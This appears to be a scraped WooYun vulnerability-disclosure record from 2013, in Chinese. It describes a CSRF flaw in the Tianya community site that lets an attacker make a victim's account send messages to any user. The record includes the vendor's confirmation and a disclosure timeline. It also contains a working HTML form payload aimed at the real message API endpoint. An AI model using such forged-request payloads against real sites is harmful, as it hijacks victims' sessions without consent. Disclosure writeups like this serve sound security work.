{"id": 9049, "wybug_id": "wooyun-2013-035271", "wybug_title": "天涯CSRF系列二: 劫持用户发送消息给任意用户", "wybug_corp": "天涯社区", "wybug_author": "LaiX", "wybug_date": "2013-08-26 11:02", "wybug_open_date": "2013-10-10 11:03", "wybug_type": "CSRF", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["敏感接口缺乏校验", "漏洞利用", "利用技巧", "类型应用", "蠕虫", "绕过", "利用", "防护策略绕过"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-08-26：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-08-26：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-09-05：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-09-15：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-09-25：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-10-10：\t细节向公众公开  简要描述： 在CSRF攻击流行之初，曾经有一种错误的观点，认为CSRF攻击只能由GET请求发起，因此很多开发者都认为只要把重要的操作改成只允许POST请求，就能防止CSRF攻击。 详细说明：  上次说到GET请求的CSRF，这次我们来看看POST请求的CSRF怎么利用。POST相对GET来说，威力略逊，不是说他们两的危害相差较大。而是说POST的感染范围并没有GET那么广泛。   漏洞证明：  天涯有一个叫发送消息的功能:\n\n抓一下包子:\n\n发现三个可控参数：params.receiveUserName:lisniuseparams.content:testparams.sourceName:消息和一个指向URLRequest URL:http://www.tianya.cn/api/msg?method=messageuser.insertmessage根据这3个参数和URL我们构造一个post的payload.html\n<form action=\"http://www.tianya.cn/api/msg?method=messageuser.insertmessage\" method=\"post\" >        <input type=\"hidden\" name=\"params.receiveUserName\" value=\"lisniuse\">        <input type=\"hidden\" name=\"params.content\" value=\"csrf\">        <input type=\"hidden\" name=\"params.sourceName\" value=\"消息\">        <input type=\"submit\" value=\"ok\"></form>\n本地测试一下\n\n\n\n\n\n   修复方案：  幸苦你们了   版权声明：转载请注明来源 LaiX@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：2  确认时间：2013-08-26 14:06 厂商回复： 感谢提供 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 2, "Ranks": null}